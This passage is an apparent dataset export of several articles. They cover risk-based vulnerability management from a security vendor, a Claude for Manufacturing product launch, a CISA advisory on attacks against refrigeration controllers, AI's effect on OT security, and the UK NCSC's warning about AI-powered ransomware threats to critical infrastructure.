Where the answer is unclear, penetration testing or proof-of-concept validation can confirm whether a finding is truly exploitable.

The distinction matters because a vulnerability's theoretical severity isn't synonymous with its practical likelihood of exploitation.

2. Asset criticality

Not every asset has the same value to the business.

A vulnerability on an employee test machine and the same vulnerability on a production server supporting a critical business process create different levels of organizational risk. That’s not to say you shouldn’t fix the vulnerability on the employee test machine, as it could still be leveraged as a pivot by an attacker to other areas of the network; however, it might take a backseat to the production instance.

Effective vulnerability management tools should help teams combine technical findings with asset context. Relevant questions include:

What business process does this asset support?

Does it store or process sensitive data?

Would compromise disrupt essential operations?

What systems could an attacker reach from it

Asset context helps transform a scanner finding into a business risk decision.

3. Exposure

Where the vulnerable asset sits also matters.

An internet-accessible system presents a fundamentally different attack surface from a tightly segmented internal asset. Network accessibility, security architecture, identity requirements and potential attack paths should all influence remediation priority.

Teams need to look beyond whether a vulnerability exists and ask: Can an attacker actually reach it?

That question can dramatically change a remediation queue.

4. Real-world attacker activity

Threat intelligence provides another critical piece of context.

Attackers do not exploit every known vulnerability equally. Some vulnerabilities rapidly become part of ransomware campaigns or automated exploitation, while others may see little meaningful attacker activity.

Understanding whether threat actors are actively targeting a vulnerability allows teams to adjust priorities as the threat environment changes.

A vulnerability that was a lower priority yesterday may require immediate action if new exploitation activity emerges today. That is why effective threat and vulnerability management is an ongoing process rather than a periodic scanning exercise.

5. Compensating controls

A vulnerability doesn't exist in isolation from the rest of the security environment.

Endpoint protection, network segmentation, application controls, identity protections, increased logging / monitoring, and other safeguards may reduce the likelihood or potential impact of exploitation. They don't necessarily eliminate the need to mitigate an identified weakness, but they can influence how urgently remediation is required.

Conversely, the absence or weakness of those controls can increase priority.

Understanding compensating controls helps security teams make remediation decisions based on the environment they actually operate, rather than on vulnerability data alone.

From vulnerability findings to meaningful risk reduction

This broader context is where managed vulnerability scanning evolves into a comprehensive vulnerability management strategy.Scanning establishes visibility into weaknesses across the environment. Mature vulnerability management enriches those findings with asset, exposure and threat context, enabling teams to determine appropriate remediation priorities.

A repeatable process can help operationalize this approach:

Discover → Validate → Prioritize → Remediate → Retest

Discovery identifies vulnerabilities across an organization’s entire, ever expanding attack surface, including IT assets, cloud environments, SaaS applications, APIs, IoT and OT systems, and other externally exposed technologies. Expert validation confirms which findings are real and exploitable, removing false positives before they consume remediation time. Prioritization then applies asset, exposure, and threat context to direct attention toward the findings that present the greatest risk. Remediation addresses that risk through activities such as patching, configuration changes, or compensating controls whether performed by internal teams, supported through patch management capabilities, or delivered through managed remediation services for assets requiring hands-on intervention. Retesting confirms that the vulnerability or exposure has been effectively mitigated.

This process also makes vulnerability data more actionable for the teams responsible for remediation. Infrastructure, application, cloud and operations teams often balance security work against availability requirements, development priorities, and other business demands. Providing those teams with contextualized priorities creates a clearer path to addressing the exposures that can have the greatest impact.

That need is growing as AI accelerates vulnerability discovery. Assessments such as SentinelOne's Wayfinder Frontier AI Services can surface validated, exploitable weaknesses across source code, software dependencies and exposed secrets in days, widening the remediation gap between finding a weakness and eliminating it. Closing that gap takes the same discipline: prioritize by real-world risk, give developers actionable guidance and retest to confirm each fix holds.

A risk-based program prioritizes remediation by exploitability and business impact. It expands scope to the full attack surface and focuses that effort around several key principles:

Evaluate exploitability: Determine how practical exploitation is within the organization's environment.

Connect vulnerabilities with critical assets: Incorporate the systems, sensitive data and business processes that could be affected.

Understand exposure: Assess how accessible vulnerable assets are and the potential attack paths leading to them.

Track attacker activity: Incorporate current threat intelligence and evidence of exploitation as conditions evolve.

Account for compensating controls: Understand how existing safeguards affect the likelihood and potential impact of exploitation.

Retest and verify fixes: Confirm, through retesting and pre-production review, that remediation or mitigation produced the intended reduction in exposure.

Together, these factors turn scanner output into a focused remediation strategy and give security teams a stronger basis for communicating priorities across the organization.

Effective vulnerability management services help organizations prioritize the vulnerabilities that represent the greatest risk and direct remediation resources accordingly. By combining vulnerability data with exploitability, asset criticality, exposure, attacker activity and existing controls, security teams can turn a growing volume of findings into clear, defensible priorities and measurable risk reduction.

LevelBlue Vulnerability Management combines continuous internal and external scanning, expert validation that filters out false positives, and risk prioritization informed by LevelBlue SpiderLabs threat intelligence, along with multiple third-party threat intelligence feeds that help contextualize vulnerabilities within each customer’s unique environment. Leveraging best-of-breed technologies, LevelBlue helps organizations focus remediation efforts on the issues most likely to impact their business, while dashboards track progress and support compliance with standards such as PCI DSS, HIPAA, NIST and ISO. For organizations that need additional support moving from identification to resolution, LevelBlue also offers Patch Management and Remediation as a Service capabilities that accelerate risk reduction across both traditional and non-traditional assets. Organizations working through Wayfinder Frontier AI Services findings can further extend that approach through LevelBlue’s Remediation Sprint and Application Resilience Program, which provides developer-focused remediation and independent validation of fixes.

articles.title: Introducing Claude for Manufacturing
articles.context: Today we’re launching Claude for Manufacturing (opens in new tab), a plugin that includes skills for work from pricing a new job to diagnosing a stopped machine
articles.full_text:
Today we’re launching Claude for Manufacturing (opens in new tab), a plugin that includes skills for work from pricing a new job to diagnosing a stopped machine. An estimator can now have Claude read a customer’s request, compare costs on similar jobs, and draft the quote. The plugin works from a manufacturer’s own records through connectors to Autodesk Fusion, Infor, Microsoft 365, and Oracle NetSuite. Claude for Manufacturing is built so the person responsible can review and approve the work before it reaches a customer or supplier.

Manufacturing teams can spend much of the day gathering information. In a 2025 Manufacturing Leadership Council survey, 79% of manufacturers said they enter data (opens in new tab)manually. With Claude carrying each process to the point of review, an estimator can focus on the price, a quality engineer on the fix, and a technician on what to check first.

Skills built for manufacturers

The plugin’s 17 skills cover sales, quality, operations, supply chain, design, and setup. Some handle a single task, while others run several in order, so Claude can carry a job through several steps until a person needs to review it. The skills can run processes that include:

Quoting a new job: An estimator can ask Claude to read a customer’s request, list what’s missing, compare costs on similar jobs, and draft the quote for release.

Investigating a failed inspection: A quality engineer can have Claude document the failure, check past reports for the same problem, rank the likely causes, and draft the corrective action report.

Diagnosing a breakdown: A technician can have Claude read the sensor exports, repair notes, photos, and manual, then rank the likely causes for the technician to check and decide on next steps.

Sourcing from another supplier: A buyer can have Claude prepare the request for quotes, then compare the bids that come back.

Comparing designs with Autodesk Fusion: An engineer can have Claude generate variations from an existing model, score them against the engineer’s targets, and draft a decision memo.

Reporting on production: A plant manager can have Claude compile production data into one report showing output against target, equipment downtime, and what the downtime and missed output cost.

These skills are a starting point. Organizations can build on them to fit their specific operations, and we plan to add new manufacturing skills over time.

Connectors to manufacturing systems

Claude for Manufacturing works with the software at the core of manufacturing operations, and that software stays central to how teams run the business:

Autodesk Fusion: Engineers can compare more design options before choosing one, because Claude generates variations from their existing model.

Infor: Buyers and planners can check purchase orders and stock before they act, because Claude looks them up in Infor.

Microsoft 365: Quality engineers can bring procedures, supplier emails, and exported reports into one job, because Claude finds them in shared folders and inboxes.

Oracle NetSuite: Estimators can price new work against actual orders, inventory, production steps, and job costs, because Claude pulls those records when it drafts a quote.

Manufacturers can also use the plugin with systems that have no connector. They save regular exports from those systems to Microsoft 365, and Claude works from the files to draft a quote or compile a production report.

Making changes in Infor with Claude

Infor, which makes core software for manufacturers, is also releasing its own plugin (opens in new tab). With the Infor connector in Claude for Manufacturing, teams can look up records. With Infor’s plugin, they can also make changes in Infor from Claude.

For example, if a steel shipment slips by two weeks, a buyer can ask Claude which customer orders are affected and how much steel other sites have. Once the buyer approves, Claude can release a purchase order to another supplier and reschedule the affected production in Infor. Claude’s access follows the buyer’s Infor permissions.

Manufacturing teams stay in control

Skills are built to end with a user’s review, so an estimator checks and releases a quote, and a quality engineer verifies a fix for the corrective action report. To support that review, Claude can link figures and claims back to the underlying data and documents.

Claude for Manufacturing doesn’t operate equipment. For that, Anthropic is developing the Model Hardware Standard (opens in new tab), a research preview that gives programmable equipment a standard way to describe its measurements, settings, and safety limits.

Following recent cyber attacks on French blood banks and European supermarkets, U.S. federal agencies are urging critical infrastructure organizations to immediately secure industrial refrigeration systems against remote tampering and temperature manipulation.

Key takeaways

Cybercriminals are actively targeting unpatched flaws, misconfigurations, and weak or hard-coded passwords in commercial cold-chain and refrigeration controllers globally.

Attackers are gaining remote access to manipulate temperature controls and spoil essential products, such as blood and food.

CISA, the FBI, and other U.S. agencies are advising organizations to isolate OT systems, secure or remove remote access, patch critical vulnerabilities, and replace end-of-life devices.

Critical infrastructure organizations in the healthcare, chemicals, transportation, and food and agriculture sectors must urgently harden their industrial refrigeration and cold-chain monitoring systems to protect food, medicines, and other essential products against ongoing cyber attacks.

That’s the call from the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and other U.S. government agencies, following a series of alarming breaches against refrigeration systems in French blood banks and European supermarkets.

“Every organization that depends on refrigeration and monitoring systems should assume it could be a target,” CISA Acting Executive Assistant Director for Cybersecurity Chris Butera said in a statement.

Attackers are remotely targeting electronic-temperature and commercial-refrigeration controllers used in grocery stores and cold storage facilities. They’re looking for unpatched vulnerabilities and other security flaws, such as misconfigurations, according to the agencies.

Once attackers gain remote access to these systems, they try to tamper with these machines’ temperature controls to damage their refrigerated products. The temperature changes could also trigger fire hazards.

In a joint fact sheet, the agencies recommend organizations immediately take the following steps:

Use strong authentication mechanisms and change systems’ default passwords.

Keep systems updated and promptly patch critical vulnerabilities.

Replace legacy devices that have reached end-of-life status.

Identify systems accessible from the internet.

Isolate operational technology (OT) systems from business networks.

Remove unnecessary remote access.

Secure necessary remote access.

Maintain offsite backups.

“This fact sheet provides clear, practical steps that network defenders can take to reduce that risk and protect operations,” said Brett Leatherman, cyber branch operations director at the U.S. Federal Bureau of Investigation (FBI), one of the authoring agencies.

The U.S. Department of Health and Human Services (HHS), U.S. Department of Agriculture (USDA), and the U.S. Department of Transportation (DoT) also contributed to the joint fact sheet.

Attackers hit hundreds of grocery stores in France several weeks ago that caused food to spoil and triggered fires. The National Cybersecurity Agency of France (ANSSI) recently told Cybersecurity Dive it has been investigating the attacks since they started in mid-October and is aware of compromises involving Danfoss AK-SM and AK-SC series controllers, as well as Copeland and Dixell XWEB controllers.

How AI Is Transforming OT Security, Critical Infrastructure Threats: Experts
articles.context: For years, the OT systems that are relied upon by critical infrastructure providers—from water treatment plants to manufacturing plants—have presented a major challenge on both...
articles.full_text:
November 4, 2026 – Published on CRN

The emergence of ultra-powerful AI cyber models is dramatically lowering the barriers for threat actors to target specialized operational technology (OT) systems, even as it also provides cybersecurity teams with never-before-available capabilities to secure critical infrastructure—overall representing a massive shift in the OT security space, experts told CRN.

For years, the OT systems that are relied upon by critical infrastructure providers—from water treatment plants to manufacturing plants—have presented a major challenge on both the side of defenders and attackers. While the systems are generally too specialized to attract the level of attention that IT security tools receive, OT has also required expertise—and effort—that often discourages hackers from targeting them.

AI is transforming both sides of that equation, according to cybersecurity experts such as Victor Wieczorek, senior vice president for offensive security at GuidePoint Security.

Attackers are believed to be increasingly using LLMs to understand unfamiliar industrial technology, as well as to look for vulnerabilities in the OT systems that wouldn’t have justified such a level of effort in the past, experts said. Defenders, meanwhile, are able to use the same technologies to develop cyber protections that are better tailored to OT systems—which were often seen as difficult to secure previously due to having such a small installed base, Wieczorek told CRN.

articles.title: Cyber chief: UK facing AI-powered attacks on critical infrastructure within two years
articles.context: AI-powered malware highly likely to be used in ransomware attack on Britain’s critical national infrastructure by 2028, new report warns

AI-powered malware highly likely to be used in ransomware attack on Britain’s critical national infrastructure by 2028, new report warns.

Head of GCHQ’s National Cyber Security Centre to warn, as a society, the era of “tech on the cheap” at expense of security is over.

New State of the Cyber Nation report calls on organisations to make “significant changes” to avert future where AI is used against UK economy and society.

The UK’s critical national infrastructure should be braced for a ransomware attack involving AI-powered malware by 2028, a new report published today [Tuesday 3 November] by the National Cyber Security Centre (NCSC) – a part of the UK’s signals intelligence agency GCHQ says.

The NCSC's State of the Cyber Nation warns that within the next two years, AI adoption by hostile actors is “highly likely” to increase the scale and efficiency of their operations, including ransomware attacks, social engineering, and vulnerability exploitation.

In a speech to launch the report, the CEO of the NCSC, Dr Richard Horne, is set to say that the AI revolution must force UK organisations to reckon with the current state of their cyber security, as new technologies will expose vulnerabilities, failings and underinvestment at an unprecedented speed and scale in the years ahead. The head of the UK's cyber agency will also set out how artificial intelligence represents the critical opportunity to improve the UK’s collective cyber resilience, but that organisations must take urgent action to address foundational investments and weaknesses or risk adversaries exploiting them instead.

The warning comes as the government is investing in the UK's defence and resilience capabilities, including greater investment in cyber defence, while taking action through the introduction of the Cyber Security and Resilience Bill and the forthcoming National Cyber Action Plan to strengthen the UK's defences, deter hostile state aggression, keep essential services running and keep the British people safe.

Alongside calls for organisations to strengthen their resilience, last week the Chancellor also announced greater investment in capabilities to help the UK harness AI for cyber defence, including £60 million into developing the first phase of a national Cyber Shield, £70 million for a new National Exposure and Real-Time Vulnerability (NERV) Centre to identify vulnerabilities across critical infrastructure and the economy, and a new AI Cyber Security Centre of Excellence, ran by the National Cyber Security Centre, in Manchester to develop world leading AI security expertise within government.

This year’s report suggests that the UK is at a point of “enormous consequence” for cyber security and that organisations across the UK must make use of the tools, standards and frameworks that already exist and are evidenced to protect them from conventional and AI-powered cyber attacks.

The NCSC is imploring organisations across the UK to face what Dr Horne is calling “a moment of choice”. In a speech to launch the report, NCSC CEO is expected to say:

In the coming months, we face a real prospect of an unprecedented rise in the number of cyber incidents. But we must be clear that is not because AI has invented new ways to attack us. But because vulnerabilities that have been tolerated for far too long can now be discovered and exploited at a scale that was once unimaginable.

“For decades, we have collectively got away with doing tech on the cheap.

“We can be a nation where leaders of all organisations actively choose to invest with urgency... And where all organisations make security and resilience a fundamental requirement, not an afterthought.

“The collective result would be a source of enduring national strength for us all.

Dr Horne will urge all organisations across the country to “take the responsibility now to make different choices”, including addressing the failure to adequately invest in their technology; not having technology unnecessarily connected to the internet; and making Cyber Essentials the starting point for cyber security, not the end goal, with organisations building greater resilience according to their size, complexity and risk.

He will say that failing to make these choices will result in leaders “having to look their investors, shareholders, employees, customers, suppliers, in the eye and explain...when food isn’t on shelves, lights aren’t on, businesses have gone under.”

In their tenth year, the National Cyber Security Centre plays a more important role than ever before, defending our security on the cyber frontline.

“The NCSC's latest annual report shows cyber threats are growing more sophisticated. We're using the power of AI to help stay ahead of those who seek to do us harm, with a new national Cyber Shield and an AI Cyber Security Centre of Excellence.

articles.title: NCSC Chief Warns of Imminent AI Ransomware Threat to UK Critical Infrastructure
articles.context: AI-powered malware is strongly expected to feature in ransomware attacks on the UK’s critical national infrastructure by 2028, the country’s National Cyber Security Centre...
articles.full_text:
AI-powered malware is strongly expected to feature in ransomware attacks on the UK’s critical national infrastructure by 2028, the country’s National Cyber Security Centre (NCSC) has warned.

The country faces “a real prospect of an unprecedented rise in the number of cyber incidents,” NCSC CEO Richard Horne said during the launch event for the agency’s annual State of the Cyber Nation report in London, on November 3.

Horne said this heightened threat is supercharged by the use of AI, whose impact “will be felt by us all, whether you and your organization choose to harness it or not.”

The report warned that AI-powered malicious software is “highly likely” to be used in cyber-attacks conducted by financially motivated hackers against the UK’s power stations, airports and hospitals by 2028.

It also warned that nation states including Russia and China will routinely use AI in their cyber activity to achieve their geopolitical goals.

Yet, Horne emphasized that AI-based threats have not fundamentally revealed anything new.

The risk that looms is “not because AI has invented new ways to attack us,” he argued, but “because vulnerabilities that have been tolerated for far too long can now be discovered and exploited at a scale that was once unimaginable.”

He pointed to “far too many organizations” relying on “tech on the cheap.”

“End-of-life systems kept running for just one more year, well-needed upgrades pushed back, as a 'cost efficiency' and technology providers failing to invest in security by design and default,” Horne outlined.

“We have installed technology then failed to invest in it throughout its lifecycle. Granted access where it was convenient rather than where it was necessary. Procured services based solely on their price without asking whether the technologies and operations underpinning them was resilient or secure. And failed to put in place the monitoring needed to detect when things go wrong,” he added.

UK Government Announces New Cybersecurity Investments

The best recent example, Horne said, is the threat of the PHP2Shell vulnerabilities. He noted that his agency has issued 110,000 proactive notifications and Early Warning alerts to UK organizations in response to the PHP vulnerabilities.

He also welcomed recent news that the British government has invested £60m ($80.4m) into developing the first phase of a national Cyber Shield, including a £25m ($33.5m) Challenge Fund supporting UK AI and cyber security innovators, and £70m ($93.8m) for a new National Exposure and Real-Time Vulnerability (NERV) Centre.

These announcements, made on October 24, come alongside an additional £120m ($160.8m) investment in the AI Security Institute (AISI) and the establishment of new AI Cyber Security Centre of Excellence, ran by the NCSC in Manchester to provide world leading AI security expertise within government.

The government has also committed £40m ($53.6m) to establishing a National Agentic Security Unit to monitor and respond to uncontrolled AI bots, alongside a further £24m ($32.1m) to strengthen public-sector cyber defenses using advanced AI technology.

Alongside these investments, Cyber Security Minister, Baroness Lloyd, announced in a speech at the NCSC Annual Review event that the UK government is offering a 75% discount on Cyber Essentials certification for micro, small and medium-sized businesses, bringing the cost down to between £80 ($107) and £125 ($168), plus VAT.

More than 230 businesses have also signed up to the government's Cyber Resilience Pledge, which will allow participating organizations to refer SMEs in their supply chains for free Cyber Essentials certification, with selected businesses also receiving support from a free cyber security advisor.

The government also announced 14 new Software Security Ambassadors, including Fortinet, Thales, Capgemini and Zscaler, which will work with the government to promote secure software development and encourage wider adoption of its Software Security Code of Practice.

A “Moment of Choice” for UK Organizations

Horne said UK organizations and at “a moment of choice” and urged them to “reckon with the current state of their cybersecurity” as new technologies like AI will expose vulnerabilities, failings and underinvestment at an unprecedented speed and scale in the years ahead.

The NCSC report also suggested that the UK is at a point of “enormous consequence” for cybersecurity and that organizations must make use of the tools, standards and frameworks that already exist and are evidenced to protect them from conventional and AI-powered cyber-attacks.

"We can be a nation where leaders of all organizations actively choose to invest with urgency and where all organizations make security and resilience a fundamental requirement, not an afterthought. The collective result would be a source of enduring national strength for us all,” Horne said in his speech.

He added that failing to make these choices will result in leaders “having to look their investors, shareholders, employees, customers, suppliers, in the eye and explain, when food isn’t on shelves, lights aren’t on, businesses have gone under.”

Commenting on the report, Anthony Young, CEO at UK-based critical infrastructure security provider Bridewell, stressed that the NCSC’s two-year warning “feels generous.”

“AI is already helping attackers, and vulnerability discovery is accelerating faster than many organizations can test and deploy patches. There is no time to wait when so many of the weaknesses attackers can exploit are already there, highlighting the recent attacks on supermarket refrigeration systems are a good example of this and “an extension of the problems we have seen for years with internet-connected CCTV and heating or ventilation systems.”

“Organizations cannot assume that insurance will resolve the consequences of an attack when essential services are disrupted. Cyber Essentials matters because so many attacks still exploit basic weaknesses, and leaving those weaknesses in place makes life too easy for everyone from amateur hackers to nation-state attackers. We’ve spent 25 years telling organisations to get the basics right. AI is making it harder for them to get away with ignoring that advice,” Young added.

The warnings come as the UK government is taking action through the introduction of the Cyber Security and Resilience Bill and the forthcoming National Cyber Action Plan to strengthen the UK's defenses.
